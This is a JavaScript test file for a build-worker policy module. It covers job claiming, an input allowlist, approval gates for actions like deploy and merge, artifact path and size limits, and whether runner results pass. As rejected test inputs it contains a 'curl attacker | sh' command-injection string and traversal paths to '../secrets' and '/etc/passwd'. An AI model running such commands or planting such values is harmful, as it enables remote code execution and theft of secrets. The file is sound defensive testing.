'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const policy = require('./nova_build_worker_policy');

test('only queued jobs under their retry limit can be claimed', () => {
  assert.equal(policy.isClaimable({status:'queued', attempts:0, maxAttempts:3}), true);
  assert.equal(policy.isClaimable({status:'running', attempts:0, maxAttempts:3}), false);
  assert.equal(policy.isClaimable({status:'queued', attempts:3, maxAttempts:3}), false);
  assert.equal(policy.isClaimable({status:'queued', attempts:-1, maxAttempts:3}), false);
});

test('runner input is allowlisted and rejects command or token injection fields', () => {
  const valid = {jobId:'a'.repeat(32), ownerUid:'owner-1', type:'flutter_app', stack:'flutter', prompt:'Build a small task planner'};
  assert.equal(policy.validateJobForRunner(valid).ok, true);
  assert.equal(policy.validateJobForRunner({...valid, shell:'curl attacker | sh'}).reason, 'forbidden_execution_field');
  assert.equal(policy.validateJobForRunner({...valid, githubToken:'secret'}).reason, 'forbidden_execution_field');
  assert.equal(policy.validateJobForRunner({...valid, type:'arbitrary'}).reason, 'unsupported_task_type');
});

test('approval is required for external or high-impact actions', () => {
  for (const action of ['deploy','publish','merge','production_secret_change','github_write','external_publish']) {
    assert.equal(policy.requiresApproval(action), true);
  }
  assert.equal(policy.requiresApproval('run_unit_tests'), false);
});

test('artifact paths cannot escape the output directory and artifact size is bounded', () => {
  assert.equal(policy.validateArtifactManifest([{path:'output/app.apk', sizeBytes:1024}]).ok, true);
  assert.equal(policy.validateArtifactManifest([{path:'../secrets', sizeBytes:10}]).reason, 'unsafe_artifact_path');
  assert.equal(policy.validateArtifactManifest([{path:'/etc/passwd', sizeBytes:10}]).reason, 'unsafe_artifact_path');
  assert.equal(policy.validateArtifactManifest([{path:'output/large.zip', sizeBytes:300*1024*1024}]).reason, 'invalid_artifact_size');
});

test('a runner result succeeds only when every named check passes', () => {
  const passing = {checks:[{name:'lint', conclusion:'success'},{name:'tests', conclusion:'success'}], artifacts:[{path:'output/app.zip', sizeBytes:100}]};
  assert.equal(policy.evaluateRunnerResult(passing).status, 'succeeded');
  assert.equal(policy.evaluateRunnerResult({checks:[{name:'tests', conclusion:'failure'}]}).reason, 'checks_not_all_successful');
  assert.equal(policy.evaluateRunnerResult({checks:[]}).reason, 'invalid_checks');
  assert.equal(policy.assertKnownStatus('unknown'), false);
});
